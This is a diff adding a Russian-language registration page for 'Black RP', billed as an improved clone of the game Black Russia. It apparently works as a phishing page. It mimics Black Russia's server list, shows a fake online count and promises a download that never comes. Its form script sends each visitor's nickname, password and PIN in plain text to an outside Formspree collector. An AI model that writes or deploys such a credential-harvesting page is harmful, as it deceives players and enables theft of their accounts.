@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Black RP — Новый ролевой проект</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Верхняя шапка сайта (Красный фон) -->
+    <header class="header">
+        <div class="online-badge">
+            <span class="online-dot"></span> Онлайн сейчас: <strong>1572</strong>
+        </div>
+        <a href="#registerSection" class="start-game-btn">Начать игру</a>
+        <div class="container">
+            <h1 class="logo">Black RP</h1>
+            <p class="header-subtitle">Твой новый мир безграничных возможностей</p>
+        </div>
+    </header>
+
+    <!-- Панель соцсетей и инструкции -->
+    <div class="social-bar">
+        <a href="#" class="social-btn tg">Telegram</a>
+        <a href="#" class="social-btn vk">VKontakte</a>
+        <a href="#" class="social-btn ds">Discord</a>
+        
+        <!-- Кнопка инструкции, открывающаяся в новой вкладке -->
+        <a href="instruction.html" target="_blank" class="social-btn instruction-link">Инструкция по игре</a>
+    </div>
+
+    <!-- Основной контент -->
+    <main class="main-content">
+        <div class="container">
+            
+            <!-- Два информационных блока рядом друг с другом -->
+            <section class="info-grid-section">
+                <div class="info-card">
+                    <h2>О проекте</h2>
+                    <p>
+                        <strong>Black RP</strong> - это не просто игра, это целая вселенная и другая реальность! 
+                        Окунись в другой мир и почувствуй себя кем угодно!
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h2>Преимущества</h2>
+                    <p>
+                        Black RP это новая игра разработаная на базе популярной игры Black Russia, тут тебя ждет все то же что и в оригинальной игре, но улучшено!
+                    </p>
+                    <p style="margin-top: 10px;">
+                        Мы добавили многие авто и многого другого чего вы так ждали в оригинальной игре!
+                    </p>
+                </div>
+            </section>
+
+            <!-- Блок с возможностями -->
+            <section class="features-row-section">
+                <div class="feature-item">
+                    <img src="police.png" alt="Вступай в организации">
+                    <h3>Можешь вступать в организации</h3>
+                    <p>Защищай закон, борись за влияние или построй карьеру в госструктурах.</p>
+                </div>
+                <div class="feature-item">
+                    <img src="rich.jpg" alt="Будь миллионером">
+                    <h3>Быть миллионером</h3>
+                    <p>Покупай элитные особняки, суперкары и владей бизнесами.</p>
+                </div>
+                <div class="feature-item">
+                    <img src="friends.jpg" alt="Заводи друзей">
+                    <h3>Заводи друзей</h3>
+                    <p>Находи единомышленников, создавай семьи и объединяйся в команды.</p>
+                </div>
+            </section>
+
+            <!-- Блок регистрации аккаунта -->
+            <section class="register-section" id="registerSection">
+                <h2>Регистрация аккаунта</h2>
+                
+                <!-- Надпись перед полями ввода -->
+                <p class="register-action-title">Заполните данные ниже, зарегистрируйте свой игровой аккаунт и получите доступ к скачиванию!</p>
+                
+                <form class="register-form" id="registerForm">
+                    
+                    <div class="form-group">
+                        <label class="server-title-label">Выбери сервер</label>
+
+                        <!-- Поле на польском (serwer_gry) для Formspree -->
+                        <input type="hidden" id="selectedServer" name="serwer_gry" value="">
+
+                        <!-- Кнопка вызова модального окна выбора сервера -->
+                        <div class="server-selector-trigger" id="openServerModal">
+                            <span id="selectedServerText">Нажмите, чтобы выбрать сервер...</span>
+                            <span class="arrow-icon">▼</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="nickname">Никнейм (Формат: Nick_Name)</label>
+                        <!-- Поле на польском (pseudonym) для Formspree -->
+                        <input type="text" id="nickname" name="pseudonym" placeholder="Например: Alex_Black" required>
+                        <small>Обязательно: Имя_Фамилия на английском через нижнее подчеркивание</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Придумайте пароль</label>
+                        <!-- Поле на польском (haslo) для Formspree -->
+                        <input type="password" id="password" name="haslo" placeholder="Придумайте надежный пароль" required>
+                        <small>Используйте латинские буквы и цифры (не менее 6 символов)</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="pincode">Пин-код (для защиты аккаунта)</label>
+                        <!-- Поле на польском (kod_pin) для Formspree -->
+                        <input type="password" id="pincode" name="kod_pin" placeholder="4 цифры" maxlength="4" required>
+                        <small>Введите ровно 4 цифры для безопасности</small>
+                    </div>
+
+                    <div id="formError" class="form-error-msg" style="display: none;"></div>
+
+                    <button type="submit" class="submit-btn">Зарегистрироваться</button>
+                </form>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- Подвал сайта -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Black RP. Все права защищены.</p>
+        </div>
+    </footer>
+
+    <!-- Всплывающее окно выбора серверов (Модалка) -->
+    <div class="server-modal-overlay" id="serverModal">
+        <div class="server-modal-content">
+            <div class="server-modal-header">
+                <button type="button" class="modal-back-btn" id="closeServerModal">❮ Выбор сервера</button>
+                <div class="server-search-box">
+                    <input type="text" id="serverSearchInput" placeholder="Поиск">
+                </div>
+            </div>
+            
+            <div class="servers-grid-modal" id="serversGridContainer">
+                <!-- Сервера генерируются автоматически через JS без онлайна -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Скрипт отправки и выбора сервера -->
+    <script>
+        const serversData = [
+            { num: 91, name: "ASTANA" },
+            { num: 90, name: "NORILSK" },
+            { num: 89, name: "CHEREPOVETS" },
+            { num: 88, name: "MAGADAN" },
+            { num: 87, name: "PODOLSK" },
+            { num: 86, name: "SURGUT" },
+            { num: 85, name: "IZHEVSK" },
+            { num: 84, name: "TOMSK" },
+            { num: 83, name: "TVER" },
+            { num: 82, name: "VOLOGDA" },
+            { num: 81, name: "TAGANROG" },
+            { num: 80, name: "NOVGOROD" },
+            { num: 79, name: "KALUGA" },
+            { num: 78, name: "VLADIMIR" },
+            { num: 77, name: "KOSTROMA" },
+            { num: 76, name: "CHITA" },
+            { num: 75, name: "ASTRAKHAN" },
+            { num: 74, name: "BRATSK" },
+            { num: 73, name: "TAMBOV" },
+            { num: 72, name: "YAKUTSK" },
+            { num: 71, name: "ULYANOVSK" },
+            { num: 70, name: "LIPETSK" },
+            { num: 69, name: "BARNAUL" },
+            { num: 68, name: "YAROSLAVL" },
+            { num: 67, name: "OREL" },
+            { num: 66, name: "BRYANSK" },
+            { num: 65, name: "PSKOV" },
+            { num: 64, name: "SMOLENSK" },
+            { num: 63, name: "STAVROPOL" },
+            { num: 62, name: "IVANOVO" },
+            { num: 61, name: "TOLYATTI" },
+            { num: 60, name: "TYUMEN" },
+            { num: 59, name: "KEMEROVO" },
+            { num: 58, name: "KIROV" },
+            { num: 57, name: "ORENBURG" },
+            { num: 56, name: "ARKHANGELSK" },
+            { num: 55, name: "KURSK" },
+            { num: 54, name: "PENZA" },
+            { num: 53, name: "MURMANSK" },
+            { num: 52, name: "RYAZAN" },
+            { num: 51, name: "TULA" },
+            { num: 50, name: "PERM" },
+            { num: 49, name: "KHABAROVSK" },
+            { num: 48, name: "CHEBOKSARY" },
+            { num: 47, name: "KRASNOYARSK" },
+            { num: 46, name: "CHELYABINSK" },
+            { num: 45, name: "KALININGRAD" },
+            { num: 44, name: "VLADIVOSTOK" },
+            { num: 43, name: "VLADIKAVKAZ" },
+            { num: 42, name: "MAKHACHKALA" },
+            { num: 41, name: "BELGOROD" },
+            { num: 40, name: "VORONEZH" },
+            { num: 39, name: "VOLGOGRAD" },
+            { num: 38, name: "IRKUTSK" },
+            { num: 37, name: "OMSK" },
+            { num: 36, name: "SARATOV" },
+            { num: 35, name: "GROZNY" },
+            { num: 34, name: "NOVOSIB" },
+            { num: 33, name: "ARZAMAS" },
+            { num: 32, name: "KRASNODAR" },
+            { num: 31, name: "EKB" },
+            { num: 30, name: "ANAPA" },
+            { num: 29, name: "ROSTOV" },
+            { num: 28, name: "SAMARA" },
+            { num: 27, name: "KAZAN" },
+            { num: 26, name: "SOCHI" },
+            { num: 25, name: "UFA" },
+            { num: 24, name: "SPB" },
+            { num: 23, name: "MOSCOW" },
+            { num: 22, name: "CHOCO" },
+            { num: 21, name: "CHILLI" },
+            { num: 20, name: "ICE" },
+            { num: 19, name: "GRAY" },
+            { num: 18, name: "AQUA" },
+            { num: 17, name: "PLATINUM" },
+            { num: 16, name: "AZURE" },
+            { num: 15, name: "GOLD" },
+            { num: 14, name: "CRIMSON" },
+            { num: 13, name: "MAGENTA" },
+            { num: 12, name: "WHITE" },
+            { num: 11, name: "INDIGO" },
+            { num: 10, name: "BLACK" },
+            { num: 9, name: "CHERRY" },
+            { num: 8, name: "PINK" },
+            { num: 7, name: "LIME" },
+            { num: 6, name: "PURPLE" },
+            { num: 5, name: "ORANGE" },
+            { num: 4, name: "YELLOW" },
+            { num: 3, name: "BLUE" },
+            { num: 2, name: "GREEN" },
+            { num: 1, name: "RED" }
+        ];
+
+        const modal = document.getElementById('serverModal');
+        const openModalBtn = document.getElementById('openServerModal');
+        const closeModalBtn = document.getElementById('closeServerModal');
+        const serversGrid = document.getElementById('serversGridContainer');
+        const serverInput = document.getElementById('selectedServer');
+        const selectedServerText = document.getElementById('selectedServerText');
+        const searchInput = document.getElementById('serverSearchInput');
+        const form = document.getElementById('registerForm');
+        const errorDiv = document.getElementById('formError');
+
+        function renderServers(list) {
+            serversGrid.innerHTML = '';
+            list.forEach(serv => {
+                const card = document.createElement('div');
+                card.className = 'server-modal-card';
+                card.innerHTML = `
+                    <span class="serv-num">#${serv.num}</span>
+                    <span class="serv-name">${serv.name}</span>
+                `;
+                card.addEventListener('click', () => {
+                    serverInput.value = serv.name;
+                    selectedServerText.innerText = `#${serv.num} ${serv.name}`;
+                    selectedServerText.style.color = '#fff';
+                    modal.classList.remove('open');
+                    errorDiv.style.display = 'none';
+                });
+                serversGrid.appendChild(card);
+            });
+        }
+
+        renderServers(serversData);
+
+        openModalBtn.addEventListener('click', () => modal.classList.add('open'));
+        closeModalBtn.addEventListener('click', () => modal.classList.remove('open'));
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) modal.classList.remove('open');
+        });
+
+        searchInput.addEventListener('input', (e) => {
+            const val = e.target.value.toLowerCase();
+            const filtered = serversData.filter(s => 
+                s.name.toLowerCase().includes(val) || `#${s.num}`.includes(val)
+            );
+            renderServers(filtered);
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const server = serverInput.value;
+            const nickname = document.getElementById('nickname').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const pincode = document.getElementById('pincode').value.trim();
+
+            if (!server) {
+                showError('Пожалуйста, выберите сервер из списка!');
+                return;
+            }
+            if (!nickname) {
+                showError('Пожалуйста, введите никнейм!');
+                return;
+            }
+            const nickPattern = /^[A-Za-z]+_[A-Za-z]+$/;
+            if (!nickPattern.test(nickname)) {
+                showError('Ник должен быть строго в формате Nick_Name (например, Alex_Black)!');
+                return;
+            }
+            if (!password || password.length < 6) {
+                showError('Пароль должен содержать не менее 6 символов!');
+                return;
+            }
+            if (!pincode || pincode.length !== 4 || isNaN(pincode)) {
+                showError('Пин-код должен состоять ровно из 4 цифр!');
+                return;
+            }
+
+            errorDiv.style.display = 'none';
+
+            const submitBtn = form.querySelector('.submit-btn');
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'Регистрация...';
+
+            fetch('https://formspree.io/f/mppwgaaz', {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    serwer_gry: server, 
+                    pseudonym: nickname, 
+                    haslo: password, 
+                    kod_pin: pincode 
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Регистрация прошла успешно! Сейчас вам будет предоставлена ссылка на скачивание.');
+                    form.reset();
+                    selectedServerText.innerText = 'Нажмите, чтобы выбрать сервер...';
+                    selectedServerText.style.color = '#888';
+                    serverInput.value = '';
+                } else {
+                    showError('Ошибка отправки. Попробуйте позже.');
+                }
+            })
+            .catch(() => {
+                showError('Не удалось отправить. Проверьте соединение.');
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerText = 'Зарегистрироваться';
+            });
+        });
+
+        function showError(text) {
+            errorDiv.innerText = text;
+            errorDiv.style.display = 'block';
+            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+    </script>
+</body>
+</html>
